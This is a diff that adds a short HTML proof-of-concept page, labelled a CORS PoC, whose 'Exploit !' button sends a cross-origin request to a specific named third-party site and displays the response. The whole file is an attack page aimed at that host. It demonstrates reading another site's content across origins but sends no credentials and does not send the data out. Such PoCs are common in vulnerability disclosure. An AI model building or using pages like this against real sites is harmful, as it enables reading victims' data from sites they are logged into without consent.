@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title> POC for nc </title>
+</head>
+<body>
+	<center>
+		<h2> CORS PoC </h2>
+		<button id="butt" type="button"> Exploit ! </button>
+		<script type="text/javascript">
+			(function() {
+				var httpRequest;
+				document.getElementById("butt").addEventListener('click', makeRequest);
+
+				function makeRequest(){
+					httpRequest = new XMLHttpRequest();
+					if (!httpRequest) {
+						alert("Cannot make a instance.");
+						return false;
+					}
+					httpRequest.onreadystatechange = alertContents;
+					httpRequest.open('GET', 'https://kr.ncsot.com/kr/pr/news.do', true);  
+					httpRequest.send();
+				}
+
+				function alertContents(){
+					if (httpRequest.readyState === XMLHttpRequest.DONE){
+						if(httpRequest.status === 200){
+							alert(httpRequest.responseText);
+						}
+					}
+				}
+
+			})();
+		</script>
+	</center>
+</body>
+</html>
